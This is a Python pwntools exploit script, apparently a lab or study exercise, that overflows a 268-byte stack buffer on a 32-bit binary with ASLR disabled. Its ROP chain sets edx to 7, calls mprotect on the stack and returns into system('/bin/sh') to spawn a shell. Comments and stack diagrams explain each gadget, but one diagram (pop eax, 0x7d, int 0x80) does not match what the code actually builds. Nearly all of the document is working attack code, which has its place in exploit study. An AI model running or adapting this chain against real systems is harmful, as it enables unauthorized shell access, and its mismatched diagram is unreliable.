""" ************************* DISABLE ASLR !!!! *************************"""

# this rop chain uses mprotect(void *addr, size_t len, int prot) to set protection on a memory region, prot is the access flag which we can use to change the stack from non-executable to executable.

# mprotect has 3 arguments which go into ebx, ecx, edx. 1st argument (ebx) is the base address of the memory region from which we start setting protection. 2nd argument (ecx) is the size of the memory region we want to set. 3rd argument (edx) is the access flag  

# we want to set prot (edx) to be 7 which is readble, writable and execuatable.

from pwn import *
libc = 0xf7dd2000 # libc base addr
pop_edx_ret = libc + 0x000344ec # found using ropper
inc_edx_ret = libc + 0x00085024
payload = "A"*268 + p32(pop_edx_ret) + p32(0xFFFFFFFF) + p32(inc_edx_ret)
"""   
CURRENT STACK:

--------------------
    "A"*268
--------------------
    pop edx; ret
--------------------
    0xFFFFFFFF          <== value to pop into edx, we can overflow this by 
                            incrementing it by 1 => it will become 0x0 => repeat                            until edx is 0x7
--------------------
    inc edx; ret        <== ESP, which is also where the return address is. 
                            ret pops the address in top of the stack (ESP) and 
                            transfer execution there 

The reason we put 0xFFFFFFFF instead of 0x0 or 0x1 is because they will contain null-bytes in our shellcode: \x00\x00\x00\x00 or \x00\x00\x00\x01
After the inc edx;ret, edx will become 0x0 due to integer overflow
"""

rop = ""
for i in range(7):
    rop += p32(inc_edx_ret) # increment edx till become 0x7

"""
CURRENT STACK:

--------------------
    "A"*268
--------------------
    pop edx; ret
--------------------
    0xFFFFFFFF          
--------------------
    inc edx; ret 
--------------------
    inc edx; ret 
--------------------
    inc edx; ret 
--------------------
    inc edx; ret
--------------------
    inc edx; ret 
--------------------
    inc edx; ret 
--------------------
    inc edx; ret 
--------------------
    inc edx; ret            <== after this edx contains 0x7
--------------------
"""

pop_ecx_ret = libc + 0x0002a3d3
pop_ebx_ret = libc + 0x0001ec65
dec_ebx_ret = libc + 0x000c3cb6
system = 0xf7e165f0
exit = 0xf7e09360
bin_sh = libc + 0x188406
mprotect = 0xf7ecf9ed # mprotect + 13, found by disas mprotect in gdb, ignored some previous instructions cause it will modify our ebx, ecx and edx. 
# mprotect = 125 # syscall number for mprotect
stack = 0xfffdd000 # this will cause null-bytes so we will have increment it then decrement it later
rop += p32(pop_ecx_ret) # instruction for ret in inc edx;ret
rop += p32(0x01010101) # value to pop into ecx
rop += p32(pop_ebx_ret) # instruction for ret in pop ecx; ret
rop += p32(stack+1) # + 1 to avoid null-bytes in shellcode
rop += p32(dec_ebx_ret) # decrement (-1) to give back the original value 
rop += p32(mprotect) # instruction for ret 
rop += "BBBB" # garbage for pop ebx in the function mprotect
rop += p32(system)
rop += p32(exit)
rop += p32(bin_sh)
"""
STACK (CONTINUED):

--------------------
    pop ecx; ret
--------------------
    0x01010101          <== value to be popped into ecx (which is the size of 
                            the memory region)
--------------------
    pop ebx; ret        <== instruction for ret in pop ecx;ret 
--------------------
    stack+1             <== address of the stack will be popped into ebx. +1 
                            to avoid null-bytes
--------------------
    dec ebx; ret        <== give back the original value of the stack.
--------------------
    pop eax; ret
--------------------
    0x7d                <== value to be popped into eax as syscall number
--------------------
    int 0x80            <== invoke syscall
--------------------


"""

""" 
FINAL STACK:

--------------------
    "A"*268
--------------------
    pop edx; ret
--------------------
    0xFFFFFFFF          <== value to pop into edx, we can overflow this by 
                            incrementing it by 1 => it will become 0x0 => repeat                            until edx is 0x7
--------------------
    inc edx; ret        <== ESP, which is also where the return address is. 
                            ret pops the address in top of the stack (ESP) and 
                            transfer execution there 
--------------------
    inc edx; ret 
--------------------
    inc edx; ret 
--------------------
    inc edx; ret
--------------------
    inc edx; ret 
--------------------
    inc edx; ret 
--------------------
    inc edx; ret 
--------------------
    inc edx; ret            <== after this edx contains 0x7
--------------------
    pop ecx; ret
--------------------
    0x01010101          <== value to be popped into ecx (which is the size of 
                            the memory region)
--------------------
    pop ebx; ret        <== instruction for ret in pop ecx;ret 
--------------------
    stack+1             <== address of the stack will be popped into ebx. +1 
                            to avoid null-bytes
--------------------
    dec ebx; ret        <== give back the original value of the stack.
--------------------
    mprotect + 13       <== call mprotect
--------------------
    "BBBB"              <== junk for pop ebx in the function mprotect 
--------------------
    system              <== instruction for ret in the function mprotect
--------------------
    exit                <== return address after executing system
--------------------
    /bin/sh             <== argument for system
--------------------    

"""

print payload + rop
